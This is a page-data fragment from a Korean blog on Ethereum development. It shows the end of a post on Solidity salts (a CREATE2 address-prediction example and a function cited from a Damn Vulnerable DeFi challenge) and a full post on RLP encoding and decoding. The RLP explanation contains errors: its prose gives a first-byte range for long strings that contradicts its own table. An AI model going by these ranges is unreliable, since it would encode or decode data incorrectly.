keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                salt<span class=\"token punctuation\">,</span>\n                <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>\n                    <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>D<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>creationCode<span class=\"token punctuation\">,</span>\n                    abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n            D d <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">D</span><span class=\"token punctuation\">{</span>salt<span class=\"token punctuation\">:</span> salt<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> predictedAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span></code></pre></div>\n<p>예시를 보면 CREATE2 opcode와 salt를 사용해 주소를 예측하고, 실제로 배포함 contract와 주소를 비교하는 것을 볼 수 있다.</p>\n<ol start=\"2\">\n<li>중복 보호</li>\n</ol>\n<p><a href=\"https://www.damnvulnerabledefi.xyz/challenges/12.html\">Damn Vulnerable Defi</a> 12본 Climber에 사용된 salt이다. 여기서 salt는 Id 중복을 보호하기 위해 사용된 것으로 보인다. 아래 코드를 보면 salt 값을 넣어 hash 값을 구함으로써 중복을 방지하고 있는 것을 알 수 있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">   <span class=\"token keyword\">function</span> <span class=\"token function\">getOperationId</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> targets<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> values<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> dataElements<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> salt\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>targets<span class=\"token punctuation\">,</span> values<span class=\"token punctuation\">,</span> dataElements<span class=\"token punctuation\">,</span> salt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2 id=\"ref\" style=\"position:relative;\"><a href=\"#ref\" aria-label=\"ref permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ref</h2>\n<p>openzeppelin docs: <a href=\"https://docs.openzeppelin.com/cli/2.8/deploying-with-create2\">https://docs.openzeppelin.com/cli/2.8/deploying-with-create2</a></p>\n<p>solidity docs: <a href=\"https://docs.soliditylang.org/en/v0.8.16/control-structures.html?highlight=create2#salted-contract-creations-create2\">https://docs.soliditylang.org/en/v0.8.16/control-structures.html?highlight=create2#salted-contract-creations-create2</a></p>\n<hr>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#salt%EB%A5%BC-%EC%95%8C%EC%95%84%EB%B3%B4%EB%8A%94-%EC%9D%B4%EC%9C%A0\">Salt를 알아보는 이유</a></p>\n</li>\n<li>\n<p><a href=\"#salt\">Salt</a></p>\n<ul>\n<li><a href=\"#example-from-solidity-docs\">Example from solidity docs</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#ref\">Ref</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"August 08, 2022","title":"Salt란 무엇인가?","categories":"solidity","author":"한성원","emoji":"🧢"},"fields":{"slug":"/S.C/salt란/"}},"prev":{"id":"afda7ff8-38b8-52ad-b0e4-a956a80a73d7","html":"<h1 id=\"rlp-encoding--decoding\" style=\"position:relative;\"><a href=\"#rlp-encoding--decoding\" aria-label=\"rlp encoding  decoding permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RLP Encoding &#x26;&#x26; Decoding</h1>\n<p>Recursive Length Prefix</p>\n<p>RLP는 직렬화(serialization) 기법으로 이더리움 네트워크에서 통신을 주고 받을 때 사용된다. 이더리움의 데이터는 RLP로 통일되어있고, transaction 전송, 블록 state, receipt 저장, DB 저장 등에 사용된다.</p>\n<p>RLPEncode와 RLPDecode를 하는 규칙은 각각 5가지 방법이 존재하며, item이라는 단위를 사용하고 있다.</p>\n<h2 id=\"rlp-encode\" style=\"position:relative;\"><a href=\"#rlp-encode\" aria-label=\"rlp encode permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><strong>RLP Encode</strong></h2>\n<ol>\n<li>\n<p>1 Byte Data</p>\n<p>1 byte data 는 ASCCI 코드를 그대로 사용한다. 즉, <strong>[0x00~0x7f]</strong> 사이의 값이다.</p>\n<blockquote>\n<p>RLP(”0x01”) = 0x01</p>\n<p>RLP(”a”) = 0x61</p>\n</blockquote>\n</li>\n<li>\n<p>String Data (0 ~ 55 bytes)</p>\n<p>String Data의 길이가 0~55 bytes인 경우, <strong>0x80 + String Data의 Length 값</strong>을 첫번째 byte로 사용한다. 즉, 첫번째 byte는 <strong>[0x80 ~ 0xb7]</strong> 사이의 값이다.</p>\n<blockquote>\n<p>RLP(”hello world”) = [<strong>0x8b</strong>, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x77, 0x6f, 0x72, 0x6c, 0x64]</p>\n<ul>\n<li><strong>0x8b</strong> 라는 첫번째 byte 값은 0x80 + Length of String이다. 즉 0x80 + 0x0b = <strong>0x8b</strong></li>\n<li>Hex 0x0b는  = Dec의 11 값이다.</li>\n</ul>\n</blockquote>\n</li>\n<li>\n<p>String Data ( > 55 bytes)</p>\n<p>String Data 가 55 bytes 보다 큰 경우, <strong>0xb7 + bytes of String Data Legth</strong> 값을 첫번째 byte로 사용한다. 즉 첫번째 byte는 [0xc1, 0xf7] 사이의 값이다. 규칙 1번과 2번과 다르게 item이 3파트로 나누어진다. 첫번째 파트는 위에 말한 값이고, 두번째 byte는 <strong>bytes of String Data Length</strong>가 들어간다. 이후 String에 대한 값을 이어붙인다.</p>\n<blockquote>\n<p>RLP(”aaaa…..”) = [<strong>0xb9</strong>, <strong>0x04</strong>, <strong>0x00</strong>, 0x61, 0x61, 0x61, 0x61, …]</p>\n<ul>\n<li>“a” 1024개로 이루어진 string 값</li>\n<li>Hex 0x0400은 Dec의 1024이다. 0x0400은 <strong>0x04, 0x00</strong>으로 나눌 수 있다.</li>\n<li>0x04와 0x00은 총 2 bytes로 첫번째 byte는 0xb7 + 0x02 = <strong>0xb9</strong></li>\n</ul>\n</blockquote>\n</li>\n<li>\n<p>Array Data: 1,2,3 규칙을 통해 RLP Encode된 item의 총 합의 길이 (0~55 bytes)</p>\n<p>Array의 item이 Encode된 아이템의 총 길이가 0~55 bytes 사이인 경우, <strong>0xc0 + total bytes of RLPEncoded item</strong> 값을 첫번째 byte로 사용한다. 즉 첫번째 byte는 [0xc1, 0xf7] 사이의 값이다. 두번째 byte부터는 RLP Encode 된 item을 이어붙인다.</p>\n<blockquote>\n<p>RLP([“<strong>hello</strong>”, “<strong>world</strong>”]) = [<strong>0xcc</strong>, <strong>0x85, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x85, 0x77, 0x6f, 0x72, 0x6c, 0x64</strong>]</p>\n<ul>\n<li>RLP(”<strong>hello</strong>”) = [0x85, 0x68, 0x65, 0x6c, 0x6c, 0x6f] ← Rule #2</li>\n<li>RLP(”<strong>world</strong>”) = [0x85, 0x77, 0x6f, 0x72, 0x6c, 0x64] ← Rule #2</li>\n<li>각각 RLPEncode된 길이는 6이므로, <strong>0xc0</strong> + 0x06 + 0x06 = <strong>0xcc</strong></li>\n</ul>\n</blockquote>\n</li>\n<li>\n<p>Array Data: 1,2,3 규칙을 통해 RLP Encode된 item의 총 합의 길이 ( > 55 bytes)</p>\n<p>Rule #3와 비슷하게 총 3 파트로 나누어져있다.</p>\n<p>Array의 item이 Encode 된 총 길이가 55 bytes보다 큰 경우, <strong>0xf7 + total bytes of RLP Encoded items</strong> 값을 첫번재 byte로 사용한다. 두번째 파트에서는 bytes는 RLPEncode 된 item의 총 길이를 이어붙인다. 막지막 3번째 파트에서는 각각 item의 RLPEncode 된 값을 이어붙인다.</p>\n<blockquote>\n<p>RLP(“a…”, “a…”) = [<strong>0xf8, 0x66, 0xb2, 0x61…, 0xb2,, 0x61..</strong>.]</p>\n<ul>\n<li>“a…” = “a” 50개로 이루어진 값</li>\n<li>RLP(”a…”) = [<strong>0xb2, 0x61, 0x61, 0x61 …</strong>] ← Rule#2</li>\n<li><strong>0xf8</strong> = <strong>0xf7</strong> <strong>+ 0x01</strong></li>\n<li>0x01 = “a” 50개로 이루어진 배열이 RLPEncode 된다면 총 길이는 0x33 이다. 총 배열의 아이템이 2개임으로 0x33 +0x33 = 0x66이다. 이때 0x66은 1 byte 임으로 첫번째 bytes를 구할 때 다음과 같은 식을 사용한다. <strong>0xf7</strong> <strong>+ 0x01</strong> = <strong>0xf8</strong></li>\n<li><strong>0x66</strong> = Total bytes of RLPEncoded items</li>\n</ul>\n</blockquote>\n</li>\n</ol>\n<h2 id=\"rlp-decode\" style=\"position:relative;\"><a href=\"#rlp-decode\" aria-label=\"rlp decode permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><strong>RLP Decode</strong></h2>\n<p>RLPDecode를 할때의 규칙은 RLPEncode의 규칙의 역과정이다.</p>\n<p>RLP Decode는 RLP Encode의 개념만 확실하다면 쉽게 할 수 Deocde 할 수 있다.</p>\n<p>Decode는 다음과 같은 과정을 거친다.</p>\n<ol>\n<li>입력된 RLP Encode된 첫번째 byte의 종류에 따라 데이터의 타입(Byte, String, Array)과 데이터의 길이(item의 갯수)를 파악한다.</li>\n<li>파악한 데이터의 타입과 offset에 따라 decoding한다.</li>\n<li>나머지 데이터를 디코딩 한다.</li>\n</ol>\n<p>첫번째 byte에 따라 다른 디코딩 방법이 적용된다.</p>\n<table>\n<thead>\n<tr>\n<th>첫번째 byte</th>\n<th>Decoding 방법</th>\n<th>Encode Rule</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[0x00~0x7f]</td>\n<td>값 그 자체가 문자데이터(ASCCI)이다.</td>\n<td># 1</td>\n</tr>\n<tr>\n<td>[0x80, 0xb7]</td>\n<td>첫번째 byte에서 0x80을 뺀 값이 문자열의 길이이고, 길이 만큼 문자열 데이터가 들어있다.</td>\n<td># 2</td>\n</tr>\n<tr>\n<td>[0xb8, 0xbf]</td>\n<td>첫번째 byte에서 0xb7을 뺀 값이 byte로 표현된 RLP item의 갯수, 그 갯수만큼 문자가 이어진다.</td>\n<td># 3</td>\n</tr>\n<tr>\n<td>[0xc0, 0xf7]</td>\n<td>첫번째 바이트에서 0xc0를 뺸 값이 배열의 갯수, 이후 Decode 규칙 1,2,3번을 활용해 deocde 가능</td>\n<td># 4</td>\n</tr>\n<tr>\n<td>[0xf8, 0xff]</td>\n<td>첫번째 바이트에서 0xf7을 뺀값이 아이템의 갯수, 모든 배열의 item의 갯수, 배열은 RLP Encoding 된 값으로 규칙 1,2,3번 활용해 decode 가능</td>\n<td># 5</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"ref\" style=\"position:relative;\"><a href=\"#ref\" aria-label=\"ref permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ref</h2>\n<p><a href=\"https://ihpark92.tistory.com/47\">https://ihpark92.tistory.com/47</a></p>\n<p><a href=\"https://medium.com/ethereum-core-research/rlp-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0-1c05a8150a04\">https://medium.com/ethereum-core-research/rlp-이해하기-1c05a8150a04</a></p>\n<p><a href=\"https://meongae.tistory.com/90\">https://meongae.tistory.com/90</a></p>\n<h2 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h2>\n<p>Hex to Dec: <a href=\"https://www.rapidtables.com/convert/number/hex-to-decimal.html\">https://www.rapidtables.com/convert/number/hex-to-decimal.html</a></p>\n<p>Byte Counter: <a href=\"https://mothereff.in/byte-counter\">https://mothereff.in/byte-counter</a></p>\n<p>RLP Enoder and Decoder: <a href=\"https://toolkit.abdk.consulting/ethereum#rlp\">https://toolkit.abdk.consulting/ethereum#rlp</a></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#rlp-encode\"><strong>RLP Encode</strong></a></li>\n<li><a href=\"#rlp-decode\"><strong>RLP Decode</strong></a></li>\n<li><a href=\"#ref\">Ref</a></li>\n<li><a href=\"#tools-used\">Tools Used</a></li>\n</ul>\n</div>","frontmatter":{"date":"January 17, 2023","title":"RLP Encodeing && RLP Decoding","categories":"EVM","author":"한성원","emoji":"🧢"},"fields":{"slug":"/EVM/RLP Encoding && Decoding/"}},"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":"holyhansss/holyhansss.github.io"}}}}},"pageContext":{"slug":"/CTFs/DamnVulnerableDefi/DamnVulnerableDefi_WriteUp/","nextSlug":"/S.C/salt란/","prevSlug":"/EVM/RLP Encoding && Decoding/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}